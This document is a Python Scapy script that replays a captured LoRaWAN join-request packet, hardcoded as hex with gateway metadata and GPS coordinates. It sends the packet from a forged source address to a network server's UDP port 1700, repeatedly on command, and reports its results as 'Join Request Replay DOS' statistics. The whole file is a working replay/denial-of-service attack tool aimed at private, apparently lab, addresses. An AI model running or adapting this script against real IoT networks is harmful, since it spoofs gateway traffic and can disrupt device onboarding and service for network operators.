import sys
from scapy.all import *

# Check if the user provided the number of packets to send
if len(sys.argv) != 2:
    print("Usage: python send_packet.py <number of packets>")
    sys.exit(1)

# Define the source and destination addresses and ports
src_addr = '192.168.56.102'
src_port = 56300
dest_addr = '192.168.56.104'
dest_port = 1700

# Define the payload as a string of hexadecimal characters ( Join request )
payloadx = '024d4400b4562d94afcda48d7b227278706b223a5b7b2274696d65223a22323032332d30352d31325431393a33353a30375a222c22746d6d73223a313336373935353332353137302c22746d7374223a313638333932303130372c226368616e223a302c2272666368223a302c2273746174223a312c2266726571223a3836382e312c22627264223a302c2272737369223a2d36302c2264617472223a225346374257313235222c226d6f6475223a224c4f5241222c22636f6472223a22342f35222c226c736e72223a372c2273697a65223a32332c2264617461223a22414141414141414141414141633145634534703763594d514e6d74437868383d227d5d2c2273746174223a7b2274696d65223a22323032332d30352d31322031393a33353a303720555443222c226c617469223a35302e38313831373439373637313133352c226c6f6e67223a342e34343332343031363537313034352c22616c7469223a302c2272786e62223a32382c2272786f6b223a32382c2272786677223a32362c2261636b72223a32372c2264776e62223a36312c2274786e62223a32367d7d'

# Convert the payload to binary format using the bytes.fromhex() method
payload = bytes.fromhex(payloadx)

# Define the IP and UDP headers
ip = IP(src=src_addr, dst=dest_addr)
udp = UDP(sport=src_port, dport=dest_port)

# Construct the packet by combining the headers and payload
packet = ip / udp / payload

# Get the number of times the packet should be sent from the command line argument
num_times = int(sys.argv[1])

# Get the start time
start_time = time.time()

# Send the packet to the destination IP address and port the specified number of times
for i in range(num_times):
    send(packet)
    time.sleep(0.5)

# Get the end time
end_time = time.time()

# Calculate the total execution time
execution_time = end_time - start_time

print("Join Request Replay DOS Statistics")
print(f"Packets sent: {num_times}")
print(f"Start time: {time.ctime(start_time)}")
print(f"End time: {time.ctime(end_time)}")
print(f"Total execution time: {execution_time} seconds")
